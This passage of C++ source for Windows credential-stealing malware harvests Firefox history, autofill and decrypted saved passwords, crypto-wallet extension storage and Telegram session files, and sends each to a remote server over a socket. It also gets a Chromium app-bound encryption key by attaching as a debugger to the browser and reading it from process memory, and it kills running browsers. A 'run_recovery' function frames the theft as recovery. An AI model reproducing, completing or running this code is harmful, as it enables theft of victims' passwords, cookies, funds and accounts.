            const char* url = (const char*)sqlite3_column_text(stmt, 0);
            const char* title = (const char*)sqlite3_column_text(stmt, 1);
            int count = sqlite3_column_int(stmt, 2);
            long long last_visit = sqlite3_column_int64(stmt, 3);
            std::string str_url = url ? url : "";
            std::string str_title = title ? title : "";
            oss_txt << "URL: " << str_url << " | Title: " << str_title << " | Visits: " << count << "\n";
            if (!first) oss_json << ",\n";
            oss_json << "    {\n";
            oss_json << "        \"url\": \"" << json_escape(str_url) << "\",\n";
            oss_json << "        \"title\": \"" << json_escape(str_title) << "\",\n";
            oss_json << "        \"visit_count\": " << count << ",\n";
            oss_json << "        \"last_visit_date\": " << std::to_string(last_visit) << "\n";
            oss_json << "    }";
            first = false;
        }
        oss_json << "\n]";
        sqlite3_finalize(stmt);
        send_string_to_server(sock, out_prefix + "/history.txt", oss_txt.str());
        send_string_to_server(sock, out_prefix + "/history.json", oss_json.str());
    }
    close_and_delete_db(db);
}

void extract_firefox_autofill(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
    sqlite3* db = copy_to_temp_and_open_db(profile_path / "formhistory.sqlite");
    if (!db) return;

    sqlite3_stmt* stmt; const char* sql = "SELECT fieldname, value FROM moz_formhistory";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        std::ostringstream oss_txt, oss_json;
        oss_json << "[\n"; bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* name = (const char*)sqlite3_column_text(stmt, 0);
            const char* value = (const char*)sqlite3_column_text(stmt, 1);
            std::string str_name = name ? name : "";
            std::string str_val = value ? value : "";
            oss_txt << "Field: " << str_name << " = " << str_val << "\n";
            if (!first) oss_json << ",\n";
            oss_json << "    {\n";
            oss_json << "        \"name\": \"" << json_escape(str_name) << "\",\n";
            oss_json << "        \"value\": \"" << json_escape(str_val) << "\"\n";
            oss_json << "    }";
            first = false;
        }
        oss_json << "\n]";
        sqlite3_finalize(stmt);
        send_string_to_server(sock, out_prefix + "/autofill.txt", oss_txt.str());
        send_string_to_server(sock, out_prefix + "/autofill.json", oss_json.str());
    }
    close_and_delete_db(db);
}

typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
typedef struct SECItemStr { int type; unsigned char *data; unsigned int len; } SECItem;
typedef SECStatus (*PK11_AuthenticatePtr)(void *slot, int load_tokens, void *wincxt);
typedef void *(*PK11_GetInternalKeySlotPtr)();
typedef void (*PK11_FreeSlotPtr)(void *slot);
typedef SECStatus (*NSS_InitPtr)(const char *configdir);
typedef SECStatus (*NSS_ShutdownPtr)();
typedef SECStatus (*PK11SDR_DecryptPtr)(SECItem *data, SECItem *result, void *cx);
struct NSS_Functions { HMODULE h_nss; NSS_InitPtr NSS_Init; NSS_ShutdownPtr NSS_Shutdown; PK11_GetInternalKeySlotPtr PK11_GetInternalKeySlot; PK11_FreeSlotPtr PK11_FreeSlot; PK11_AuthenticatePtr PK11_Authenticate; PK11SDR_DecryptPtr PK11SDR_Decrypt; };

bool load_nss(const fs::path& nss_path, NSS_Functions& f) {
    SetDllDirectoryW(nss_path.wstring().c_str()); f.h_nss = LoadLibraryW((nss_path / "nss3.dll").wstring().c_str()); if (!f.h_nss) return false;
    f.NSS_Init = (NSS_InitPtr)GetProcAddress(f.h_nss, "NSS_Init"); f.NSS_Shutdown = (NSS_ShutdownPtr)GetProcAddress(f.h_nss, "NSS_Shutdown");
    f.PK11_GetInternalKeySlot = (PK11_GetInternalKeySlotPtr)GetProcAddress(f.h_nss, "PK11_GetInternalKeySlot"); f.PK11_FreeSlot = (PK11_FreeSlotPtr)GetProcAddress(f.h_nss, "PK11_FreeSlot");
    f.PK11_Authenticate = (PK11_AuthenticatePtr)GetProcAddress(f.h_nss, "PK11_Authenticate"); f.PK11SDR_Decrypt = (PK11SDR_DecryptPtr)GetProcAddress(f.h_nss, "PK11SDR_Decrypt");
    return f.NSS_Init && f.NSS_Shutdown && f.PK11_GetInternalKeySlot && f.PK11_FreeSlot && f.PK11_Authenticate && f.PK11SDR_Decrypt;
}

void extract_firefox_passwords(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const fs::path& nss_dir) {
    NSS_Functions nss; if (!load_nss(nss_dir, nss)) return;
    if (nss.NSS_Init(profile_path.string().c_str()) == SECSuccess) {
        void* slot = nss.PK11_GetInternalKeySlot();
        if (slot) {
            if (nss.PK11_Authenticate(slot, TRUE, NULL) == SECSuccess) {
                fs::path logins_path = profile_path / "logins.json"; std::ifstream ifs(logins_path);
                if (ifs.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
                    std::ostringstream oss_txt, oss_json;
                    oss_json << "[\n"; bool first = true;
                    size_t pos = 0;
                    while ((pos = content.find("\"hostname\":\"", pos)) != std::string::npos) {
                        pos += 12; size_t end = content.find("\"", pos); std::string host = content.substr(pos, end - pos);
                        pos = content.find("\"encryptedUsername\":\"", pos); pos += 21; end = content.find("\"", pos); std::string enc_user = content.substr(pos, end - pos);
                        pos = content.find("\"encryptedPassword\":\"", pos); pos += 21; end = content.find("\"", pos); std::string enc_pass = content.substr(pos, end - pos);
                        auto user_data = base64_decode(enc_user); auto pass_data = base64_decode(enc_pass);
                        SECItem user_item = { 0, user_data.data(), (unsigned int)user_data.size() }; SECItem pass_item = { 0, pass_data.data(), (unsigned int)pass_data.size() };
                        SECItem dec_user = { 0, NULL, 0 }; SECItem dec_pass = { 0, NULL, 0 };
                        if (nss.PK11SDR_Decrypt(&user_item, &dec_user, NULL) == SECSuccess && nss.PK11SDR_Decrypt(&pass_item, &dec_pass, NULL) == SECSuccess) {
                            std::string str_user = std::string((char*)dec_user.data, dec_user.len);
                            std::string str_pass = std::string((char*)dec_pass.data, dec_pass.len);
                            oss_txt << "URL: " << host << "\nUser: " << str_user << "\nPass: " << str_pass << "\n---\n";
                            if (!first) oss_json << ",\n";
                            oss_json << "    {\n";
                            oss_json << "        \"url\": \"" << json_escape(host) << "\",\n";
                            oss_json << "        \"username\": \"" << json_escape(str_user) << "\",\n";
                            oss_json << "        \"password\": \"" << json_escape(str_pass) << "\"\n";
                            oss_json << "    }";
                            first = false;
                        }
                        pos = end;
                    }
                    oss_json << "\n]";
                    send_string_to_server(sock, out_prefix + "/passwords.txt", oss_txt.str());
                    send_string_to_server(sock, out_prefix + "/passwords.json", oss_json.str());
                }
            }
            nss.PK11_FreeSlot(slot);
        }
        nss.NSS_Shutdown();
    }
    FreeLibrary(nss.h_nss);
}

void extract_firefox_wallets(SOCKET sock, const fs::path& profile_path, const std::string& browser_name, const std::string& profile_name) {
    fs::path extensions_json = profile_path / "extensions.json";
    if (!fs::exists(extensions_json)) return;

    std::ifstream ifs(extensions_json);
    if (!ifs.is_open()) return;

    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
    std::string content_lower = to_lower(content);

    std::string safe_browser = to_lower(browser_name);
    std::replace(safe_browser.begin(), safe_browser.end(), ' ', '_');

    for (const auto& wallet : target_wallets) {
        if (wallet.firefox_keyword.empty()) continue;

        std::string wallet_prefix = "wallets/" + wallet.name + "_" + safe_browser + "/" + profile_name;

        std::string keyword = wallet.firefox_keyword;
        size_t pos = 0;
        while ((pos = content_lower.find(keyword, pos)) != std::string::npos) {
            size_t obj_start = content.rfind('{', pos);
            if (obj_start == std::string::npos) obj_start = pos;

            size_t id_pos = content.find("\"id\":\"", obj_start);
            if (id_pos != std::string::npos) {
                id_pos += 6;
                size_t id_end = content.find("\"", id_pos);
                if (id_end != std::string::npos) {
                    std::string internal_id = content.substr(id_pos, id_end - id_pos);

                    size_t uuid_find_pos = content.find("\"" + internal_id + "\"");
                    if (uuid_find_pos != std::string::npos) {
                        size_t uuid_pos = content.find("\"uuid\":\"", uuid_find_pos);
                        if (uuid_pos != std::string::npos) {
                            uuid_pos += 8;
                            size_t uuid_end = content.find("\"", uuid_pos);
                            if (uuid_end != std::string::npos) {
                                std::string uuid = content.substr(uuid_pos, uuid_end - uuid_pos);
                                fs::path storage_path = profile_path / "storage" / "default" / ("moz-extension+++" + uuid);
                                if (fs::exists(storage_path)) {
                                    send_directory_recursively(sock, storage_path, wallet_prefix + "/storage");
                                }
                            }
                        }
                    }
                }
            }
            pos += keyword.length();
        }
    }
}

void extract_firefox_data(SOCKET sock, const BrowserConfig& config, const std::wstring& user_data_dir) {
    fs::path user_data(user_data_dir); fs::path nss_dir; std::vector<std::wstring> search_roots = get_search_roots();
    for (const auto& path : config.exe_paths) {
        for (const auto& root : search_roots) { fs::path full_path = fs::path(root) / path; if (fs::exists(full_path)) { nss_dir = full_path.parent_path(); break; } }
        if (!nss_dir.empty()) break;
    }
    std::error_code ec;
    for (const auto& entry : fs::directory_iterator(user_data, ec)) {
        if (ec) break;
        try {
            if (entry.is_directory()) {
                fs::path profile_path = entry.path(); if (fs::exists(profile_path / "cookies.sqlite") || fs::exists(profile_path / "logins.json")) {
                    std::string profile_name = profile_path.filename().string(); std::string out_prefix = config.output_dir + "/" + profile_name;
                    extract_firefox_cookies(sock, profile_path, out_prefix, config.name, profile_name); extract_firefox_history(sock, profile_path, out_prefix); extract_firefox_autofill(sock, profile_path, out_prefix);
                    if (!nss_dir.empty()) extract_firefox_passwords(sock, profile_path, out_prefix, nss_dir);
                    extract_firefox_wallets(sock, profile_path, config.name, profile_name);
                }
            }
        } catch (...) {}
    }
}

void extract_telegram_session(SOCKET sock) {
    wchar_t* appdata; if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdata) != S_OK) return;
    fs::path tdata_path = fs::path(appdata) / L"Telegram Desktop" / L"tdata"; CoTaskMemFree(appdata);
    if (!fs::exists(tdata_path)) return;

    send_status(sock, "Extracting Telegram session...");

    for (const auto& f : {"key_datas", "map0", "map1", "settingss"}) {
        fs::path src = tdata_path / f;
        if (fs::exists(src)) send_file_from_disk(sock, src, "telegram session/tdata/" + src.filename().string());
    }

    std::error_code ec_tel;
    for (const auto& entry : fs::directory_iterator(tdata_path, ec_tel)) {
        if (ec_tel) break;
        if (entry.is_directory()) {
            std::string folder_name = entry.path().filename().string();
            if (folder_name.length() == 16 && std::all_of(folder_name.begin(), folder_name.end(), [](unsigned char c) { return std::isxdigit(c); })) {
                std::error_code ec_sub;
                for (const auto& sub_entry : fs::recursive_directory_iterator(entry.path(), ec_sub)) {
                    if (ec_sub) break;
                    if (!sub_entry.is_directory()) {
                        std::string filename = sub_entry.path().filename().string();
                        if (filename.find(".log") == std::string::npos && filename.find("dumps") == std::string::npos) {
                            send_file_from_disk(sock, sub_entry.path(), "telegram session/tdata/" + folder_name + "/" + fs::relative(sub_entry.path(), entry.path()).string());
                        }
                    }
                }
            }
        }
    }
}

std::vector<std::wstring> get_search_roots() {
    std::vector<std::wstring> roots; wchar_t* path = NULL;
    if (SHGetKnownFolderPath(FOLDERID_ProgramFiles, 0, NULL, &path) == S_OK) { roots.push_back(path); CoTaskMemFree(path); }
    if (SHGetKnownFolderPath(FOLDERID_ProgramFilesX86, 0, NULL, &path) == S_OK) { roots.push_back(path); CoTaskMemFree(path); }
    if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path) == S_OK) { roots.push_back(path); CoTaskMemFree(path); }
    wchar_t env_path[MAX_PATH];
    if (GetEnvironmentVariableW(L"ProgramW6432", env_path, MAX_PATH) > 0) roots.push_back(env_path);
    return roots;
}

std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use_roaming) {
    wchar_t* path = NULL;
    if (SHGetKnownFolderPath(use_roaming ? FOLDERID_RoamingAppData : FOLDERID_LocalAppData, 0, NULL, &path) == S_OK) {
        fs::path p(path); CoTaskMemFree(path);
        for (const auto& component : subdir) p /= component;
        if (fs::exists(p)) return p.wstring();
    }
    return L"";
}

bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi) {
    fs::path local_state_path = fs::path(user_data_dir) / L"Local State";
    std::ifstream ifs(local_state_path); if (!ifs.is_open()) return false;
    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
    size_t pos = content.find("\"encrypted_key\":\""); if (pos == std::string::npos) return false;
    pos += 17; size_t end = content.find("\"", pos); if (end == std::string::npos) return false;
    std::string encrypted_key_b64 = content.substr(pos, end - pos);
    std::vector<uint8_t> encrypted_key = base64_decode(encrypted_key_b64); if (encrypted_key.empty()) return false;
    is_dpapi = (encrypted_key.size() >= 5 && memcmp(encrypted_key.data(), "DPAPI", 5) == 0);
    const uint8_t* blob_data = is_dpapi ? encrypted_key.data() + 5 : encrypted_key.data();
    size_t blob_size = is_dpapi ? encrypted_key.size() - 5 : encrypted_key.size();
    DATA_BLOB input = { (DWORD)blob_size, (BYTE*)blob_data }; DATA_BLOB output = { 0, NULL };
    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        if (output.cbData == 32) { key.assign(output.pbData, output.pbData + output.cbData); LocalFree(output.pbData); return true; }
        LocalFree(output.pbData);
    }
    return false;
}

std::vector<uint8_t> read_process_memory_chunk(HANDLE h_process, void* addr, size_t size) {
    std::vector<uint8_t> buffer(size); SIZE_T bytes_read = 0;
    if (ReadProcessMemory(h_process, addr, buffer.data(), size, &bytes_read)) buffer.resize(bytes_read);
    else buffer.clear();
    return buffer;
}

InterceptPoint find_target_address(HANDLE h_process, void* base_addr, const std::string& browser_name) {
    InterceptPoint result;
    IMAGE_DOS_HEADER dos_header; SIZE_T bytes_read = 0;
    if (!ReadProcessMemory(h_process, base_addr, &dos_header, sizeof(dos_header), &bytes_read)) return result;
    IMAGE_NT_HEADERS64 nt_headers;
    if (!ReadProcessMemory(h_process, (BYTE*)base_addr + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers), &bytes_read)) return result;
    WORD section_count = nt_headers.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(section_count);
    if (!ReadProcessMemory(h_process, (BYTE*)base_addr + dos_header.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt_headers.FileHeader.SizeOfOptionalHeader, sections.data(), sizeof(IMAGE_SECTION_HEADER) * section_count, &bytes_read)) return result;

    std::vector<std::string> target_strings = {
        "OSCrypt.AppBoundProvider.Decrypt.ResultCode",
        "OSCrypt.AppBoundProvider.Encrypt.ResultCode",
        "OSCrypt.AppBoundProvider.Decrypt.Result",
        "OSCrypt.AppBoundProvider.Encrypt.Result"
    };

    size_t string_va = 0;
    for (const auto& target_string : target_strings) {
        std::vector<uint8_t> needle(target_string.begin(), target_string.end());
        for (const auto& section : sections) {
            const char* sec_name = (const char*)section.Name;
            if (strstr(sec_name, ".rdata") || strstr(sec_name, ".data")) {
                std::vector<uint8_t> section_data = read_process_memory_chunk(h_process, (BYTE*)base_addr + section.VirtualAddress, section.Misc.VirtualSize);
                if (section_data.empty()) continue;
                auto it = std::search(section_data.begin(), section_data.end(), needle.begin(), needle.end());
                if (it != section_data.end()) {
                    string_va = (size_t)base_addr + section.VirtualAddress + std::distance(section_data.begin(), it);
                    break;
                }
            }
        }
        if (string_va != 0) break;
    }
    if (string_va == 0) return result;

    for (const auto& section : sections) {
        if (strstr((const char*)section.Name, ".text")) {
            size_t section_start = (size_t)base_addr + section.VirtualAddress;
            std::vector<uint8_t> section_data = read_process_memory_chunk(h_process, (BYTE*)base_addr + section.VirtualAddress, section.Misc.VirtualSize);
            if (section_data.empty()) continue;
            for (size_t pos = 0; pos + 7 <= section_data.size(); ++pos) {
                uint8_t rex = section_data[pos];
                if ((rex & 0xF8) == 0x48 && section_data[pos+1] == 0x8D) {
                    uint8_t modrm = section_data[pos+2];
                    if ((modrm & 0xC7) == 0x05) { // Mod=00, RM=101 (RIP-relative)
                        int32_t offset = *(int32_t*)&section_data[pos+3];
                        size_t rip = section_start + pos + 7;
                        size_t target = (size_t)((int64_t)rip + offset);
                        if (target == string_va) {
                            result.address = section_start + pos;
                            int reg = (modrm >> 3) & 7;
                            if (rex & 0x04) reg += 8; // REX.R bit
                            result.reg_index = reg;
                            return result;
                        }
                    }
                }
            }
        }
    }
    return result;
}

std::vector<uint32_t> get_all_threads(uint32_t process_id) {
    std::vector<uint32_t> threads;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te; te.dwSize = sizeof(THREADENTRY32);
        if (Thread32First(snapshot, &te)) {
            do { if (te.th32OwnerProcessID == process_id) threads.push_back(te.th32ThreadID); } while (Thread32Next(snapshot, &te));
        }
        CloseHandle(snapshot);
    }
    return threads;
}

void set_hardware_breakpoint(uint32_t thread_id, size_t address) {
    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if (h_thread) {
        SuspendThread(h_thread); CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThreadContext(h_thread, &ctx)) { ctx.Dr0 = address; ctx.Dr7 = (ctx.Dr7 & ~0b11) | 0b01; SetThreadContext(h_thread, &ctx); }
        ResumeThread(h_thread); CloseHandle(h_thread);
    }
}

void clear_hardware_breakpoints(uint32_t process_id) {
    std::vector<uint32_t> threads = get_all_threads(process_id);
    for (uint32_t thread_id : threads) {
        HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
        if (h_thread) {
            SuspendThread(h_thread); CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (GetThreadContext(h_thread, &ctx)) { ctx.Dr0 = 0; ctx.Dr7 &= ~0b11; SetThreadContext(h_thread, &ctx); }
            ResumeThread(h_thread); CloseHandle(h_thread);
        }
    }
}

void set_resume_flag(uint32_t thread_id) {
    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if (h_thread) {
        SuspendThread(h_thread); CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_CONTROL;
        if (GetThreadContext(h_thread, &ctx)) { ctx.EFlags |= 0x10000; SetThreadContext(h_thread, &ctx); }
        ResumeThread(h_thread); CloseHandle(h_thread);
    }
}

std::vector<uint8_t> debug_loop_get_key(SOCKET sock, uint32_t process_id, const BrowserConfig& config) {
    DEBUG_EVENT debug_event = { 0 };
    size_t target_rva = 0;
    std::vector<uint8_t> extracted_key;
    DWORD startTime = GetTickCount();
    const DWORD timeout = 30000;
    std::map<uint32_t, HANDLE> process_handles;
    std::map<uint32_t, size_t> dll_bases;
    std::set<size_t> patched_addresses;
    int prioritized_reg = -1;

    while (GetTickCount() - startTime < timeout) {
        if (!WaitForDebugEvent(&debug_event, 100)) continue;
        switch (debug_event.dwDebugEventCode) {
        case CREATE_PROCESS_DEBUG_EVENT:
            process_handles[debug_event.dwProcessId] = debug_event.u.CreateProcessInfo.hProcess;
            break;
        case EXIT_PROCESS_DEBUG_EVENT:
            process_handles.erase(debug_event.dwProcessId);
            if (debug_event.dwProcessId == process_id) { ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE); return extracted_key; }
            break;
        case LOAD_DLL_DEBUG_EVENT: {
            wchar_t buffer[MAX_PATH];
            if (GetFinalPathNameByHandleW(debug_event.u.LoadDll.hFile, buffer, MAX_PATH, 0)) {
                std::wstring path = buffer;
                std::wstring dll_name_w = utf8_to_wstring(config.dll_name);
                if (path.find(dll_name_w) != std::wstring::npos) {
                    dll_bases[debug_event.dwProcessId] = (size_t)debug_event.u.LoadDll.lpBaseOfDll;
                    send_status(sock, "Module loaded: " + config.dll_name);
                    if (target_rva == 0) {
                        InterceptPoint ip = find_target_address(process_handles[debug_event.dwProcessId], debug_event.u.LoadDll.lpBaseOfDll, config.name);
                        if (ip.address != 0) {
                            target_rva = ip.address - (size_t)debug_event.u.LoadDll.lpBaseOfDll;
                            prioritized_reg = ip.reg_index;
                            send_status(sock, "Interception pattern found in " + config.dll_name + " (Reg: " + std::to_string(prioritized_reg) + ")");
                        }
                    }
                    if (target_rva != 0) {
                        size_t target_addr = (size_t)debug_event.u.LoadDll.lpBaseOfDll + target_rva;
                        std::vector<uint32_t> threads = get_all_threads(debug_event.dwProcessId);
                        for (uint32_t thread_id : threads) set_hardware_breakpoint(thread_id, target_addr);
                        uint8_t int3 = 0xCC; SIZE_T written;
                        if (WriteProcessMemory(process_handles[debug_event.dwProcessId], (LPVOID)target_addr, &int3, 1, &written)) {
                            patched_addresses.insert(target_addr);
                            send_status(sock, "Interception breakpoint set.");
                        }
                    }
                }
            }
            break;
        }
        case EXCEPTION_DEBUG_EVENT: {
            uint32_t code = debug_event.u.Exception.ExceptionRecord.ExceptionCode;
            size_t addr = (size_t)debug_event.u.Exception.ExceptionRecord.ExceptionAddress;
            if (code == EXCEPTION_SINGLE_STEP || code == EXCEPTION_BREAKPOINT) {
                size_t current_target = 0;
                if (target_rva != 0 && dll_bases.count(debug_event.dwProcessId)) current_target = dll_bases[debug_event.dwProcessId] + target_rva;
                if (addr == current_target || (code == EXCEPTION_BREAKPOINT && patched_addresses.count(addr))) {
                    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, debug_event.dwThreadId);
                    if (h_thread) {
                        CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_FULL;
                        if (GetThreadContext(h_thread, &ctx)) {
                            std::vector<DWORD64> all_regs = {
                                ctx.Rax, ctx.Rcx, ctx.Rdx, ctx.Rbx, ctx.Rsp, ctx.Rbp, ctx.Rsi, ctx.Rdi,
                                ctx.R8, ctx.R9, ctx.R10, ctx.R11, ctx.R12, ctx.R13, ctx.R14, ctx.R15
                            };
                            std::vector<DWORD64> candidates;
                            if (prioritized_reg >= 0 && prioritized_reg < (int)all_regs.size()) {
                                candidates.push_back(all_regs[prioritized_reg]);
                            }
                            for (size_t i = 0; i < all_regs.size(); ++i) {
                                if ((int)i != prioritized_reg) candidates.push_back(all_regs[i]);
                            }
                            for (DWORD64 ptr : candidates) {
                                if (ptr < 0x10000) continue;
                                std::vector<uint8_t> buf(32); SIZE_T br = 0;
                                if (ReadProcessMemory(process_handles[debug_event.dwProcessId], (LPCVOID)ptr, buf.data(), 32, &br)) {
                                    auto check_key = [&](const std::vector<uint8_t>& k) {
                                        if (k.size() != 32) return false;
                                        bool all_zero = true;
                                        for (uint8_t b : k) if (b != 0) { all_zero = false; break; }
                                        return !all_zero;
                                    };

                                    if (check_key(buf)) { extracted_key = buf; break; }

                                    uint64_t ptr_val = *(uint64_t*)buf.data();
                                    if (ptr_val > 0x10000) {
                                        std::vector<uint8_t> buf2(32);
                                        if (ReadProcessMemory(process_handles[debug_event.dwProcessId], (LPCVOID)ptr_val, buf2.data(), 32, &br)) {
                                            if (check_key(buf2)) { extracted_key = buf2; break; }
                                        }
                                    }

                                    uint64_t actual_ptr = *(uint64_t*)&buf[0];
                                    uint64_t length = *(uint64_t*)&buf[8];
                                    if (length == 32 && actual_ptr > 0x10000) {
                                        std::vector<uint8_t> key2(32);
                                        if (ReadProcessMemory(process_handles[debug_event.dwProcessId], (LPCVOID)actual_ptr, key2.data(), 32, &br)) {
                                            if (check_key(key2)) { extracted_key = key2; break; }
                                        }
                                    }
                                }
                            }
                        }
                        CloseHandle(h_thread);
                    }
                    if (!extracted_key.empty()) {
                        for (auto const& [pid, handle] : process_handles) clear_hardware_breakpoints(pid);
                        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
                        return extracted_key;
                    }
                }
                if (code == EXCEPTION_SINGLE_STEP) set_resume_flag(debug_event.dwThreadId);
            }
            break;
        }
        }
        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
    }
    return extracted_key;
}

static void kill_processes_by_name(const std::string& target_name) {
    std::wstring target_name_w = utf8_to_wstring(target_name);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe; pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(snapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, target_name_w.c_str()) == 0) {
                    HANDLE h_proc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (h_proc) { TerminateProcess(h_proc, 0); CloseHandle(h_proc); }
                }
            } while (Process32NextW(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
}

static std::wstring get_browser_exe_path(const std::wstring& browser_name) {
    std::wstring path = L""; HKEY hKey;
    std::wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browser_name;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t buffer[MAX_PATH]; DWORD size = sizeof(buffer);
        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) path = buffer;
        RegCloseKey(hKey);
    }
    if (path.empty()) {
        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t buffer[MAX_PATH]; DWORD size = sizeof(buffer);
            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) path = buffer;
            RegCloseKey(hKey);
        }
    }
    return path;
}

void run_recovery(SOCKET sock) {
    if (sock != INVALID_SOCKET) {
        std::string start_msg = "{\"action\":\"recovery_start\"}\r\n";
        send_with_mutex(sock, start_msg.c_str(), (int)start_msg.size());
    }
    send_status(sock, "Starting browser recovery...");
    std::vector<BrowserConfig> configs = {
        {"Google Chrome", "chrome.exe", {L"chrome.exe"}, "chrome.dll", {L"Google", L"Chrome", L"User Data"}, "browsers/Google Chrome", "chrome_tmp", false, false, true, false},
        {"Microsoft Edge", "msedge.exe", {L"msedge.exe"}, "msedge.dll", {L"Microsoft", L"Edge", L"User Data"}, "browsers/Microsoft Edge", "edge_tmp", true, false, true, false},
        {"Edge WebView2", "msedge.exe", {L"msedge.exe"}, "msedge.dll", {L"Microsoft", L"Edge", L"WebView2", L"EBWebView"}, "browsers/Edge WebView2", "webview2_tmp", true, false, true, false},
        {"Brave", "brave.exe", {L"brave.exe"}, "chrome.dll", {L"BraveSoftware", L"Brave-Browser", L"User Data"}, "browsers/Brave", "brave_tmp", false, false, true, false},
        {"Opera Stable", "opera.exe", {L"launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera Stable"}, "browsers/Opera Stable", "opera_tmp", false, true, false, false},
        {"Opera GX", "opera.exe", {L"launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera GX Stable"}, "browsers/Opera GX", "operagx_tmp", false, true, false, false},
        {"New Outlook", "", {}, "", {L"Microsoft", L"Olk", L"EBWebView"}, "mail_clients/Outlook", "outlook_tmp", false, false, false, false},
        {"Mozilla Firefox", "firefox.exe", {L"firefox.exe"}, "nss3.dll", {L"Mozilla", L"Firefox", L"Profiles"}, "browsers/Mozilla Firefox", "firefox_tmp", false, true, false, true},
        {"Waterfox", "waterfox.exe", {L"waterfox.exe"}, "nss3.dll", {L"Waterfox", L"Profiles"}, "browsers/Waterfox", "waterfox_tmp", false, true, false, true},
        {"LibreWolf", "librewolf.exe", {L"librewolf.exe"}, "nss3.dll", {L"LibreWolf", L"Profiles"}, "browsers/LibreWolf", "librewolf_tmp", false, true, false, true},
        {"Mozilla Thunderbird", "thunderbird.exe", {L"thunderbird.exe"}, "nss3.dll", {L"Thunderbird", L"Profiles"}, "mail_clients/Thunderbird", "thunderbird_tmp", false, true, false, true},
        {"Yandex Browser", "browser.exe", {L"browser.exe"}, "browser.dll", {L"Yandex", L"YandexBrowser", L"User Data"}, "browsers/Yandex Browser", "yandex_tmp", false, false, false, false}
    };
    send_status(sock, "Terminating browser processes...");
    kill_processes_by_name("chrome.exe"); kill_processes_by_name("msedge.exe"); kill_processes_by_name("brave.exe"); kill_processes_by_name("opera.exe"); kill_processes_by_name("browser.exe");
    for (const auto& config : configs) {
        std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
        if (user_data_dir.empty() && config.name == "New Outlook") user_data_dir = get_user_data_dir({L"Microsoft", L"Olk", L"EBWebView"}, false);
        if (user_data_dir.empty()) continue;
        send_status(sock, "Checking " + config.name + "...");
        std::vector<uint8_t> v10_key; bool is_dpapi = false; bool has_key = get_v10_key(user_data_dir, v10_key, is_dpapi);
        if (config.is_firefox) { extract_firefox_data(sock, config, user_data_dir); continue; }
        if (has_key && !config.has_abe) { extract_all_profiles_data(sock, {}, config, user_data_dir); continue; }
        if (!config.has_abe) { extract_all_profiles_data(sock, {}, config, user_data_dir); continue; }
        std::wstring exe_path = L"";
        if (!config.process_name.empty()) exe_path = get_browser_exe_path(utf8_to_wstring(config.process_name));
        if (exe_path.empty()) {
            std::vector<std::wstring> search_roots = get_search_roots();
            for (const auto& rel_path : config.exe_paths) {
                for (const auto& root : search_roots) {
                    fs::path full = fs::path(root) / rel_path;
                    if (fs::exists(full)) { exe_path = full.wstring(); break; }
                }
                if (!exe_path.empty()) break;
            }
        }
        if (exe_path.empty()) {
            extract_all_profiles_data(sock, {}, config, user_data_dir);
            continue;
        }
        STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 };
        std::wstring cmd_line = L"\"" + exe_path + L"\" --no-sandbox --disable-gpu --no-first-run --no-default-browser-check";
